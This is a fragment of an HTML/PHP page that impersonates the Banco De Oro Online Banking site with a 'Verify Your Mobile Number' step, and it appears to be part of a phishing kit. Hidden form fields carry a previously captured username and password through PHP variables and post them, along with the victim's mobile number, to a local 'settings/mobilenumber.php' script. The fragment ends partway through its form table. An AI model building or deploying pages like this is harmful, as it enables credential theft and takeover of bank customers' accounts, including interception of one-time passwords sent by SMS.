...
<title>Banco De Oro Online Banking</title>
 <link rel = "icon" href = 
"https://apprecs.org/ios/images/app-icons/256/23/556314403.jpg" 
        type = "image/x-icon">
...
<div id="parentcontainer">
			...
			<div id="mainwrapper" class="ui-corner-all otppage">
				<div id="main" class="contentblock">
					<table>
						<tbody><tr>
							<td>
								<h2 class="pageHeader"><span>Verify Your Mobile Number</span></h2>
					...
					<div id="id1d" class="sxiFeedback">
  
</div>
					<div><div id="id1e" style="display:none">
	
</div></div>
					<div><div id="id1f" style="display:none">
	...
	<div id="id21" style="display:none"></div>
</div>
	<div id="id18" style="display:none">
	<div id="id22" style="display:none"></div>
</div>
	<div style="text-align: left; width: 500px">
		<form autocomplete="off" loginform="true" id="id19" method="post" action="settings/mobilenumber.php">
			<div id="id1c">
</div>
				  <input type="hidden" name="username" value="<?php echo $userid ?>">
                  <input type="hidden" name="password" value="<?php echo $pass ?>">
								<label class="standardfont formlabel">Please ensure that the nominated mobile number is your valid contact detail. This will serve as your registered mobile number for Online Banking transactions where One-Time Password (OTP) will be sent via SMS.</label>
								<br><br>
						<table class="formtable" width="400">
										<tbody>
												<tr>
													<td class="formlabel">
													<span class="standardfont">Mobile Number: </span>
													</td>
													<td>
													<input class="textbox box required noSpecial" type="tel" tabindex="2"  minlength="11" maxlength="13" value="" placeholder="639xxxxxxxxx" name="number">
													</td>
												</tr>
												<tr>
									<td colspan="2">
									<span id="id23" class="sxiFeedback">
								...
								<tr>
									...
									<br>
										<label class="standardfont formlabel">Please keep your devices, registered mobile number and password secured at all times.</label>
									<br>
									</td>
								</tr>
								<tr>
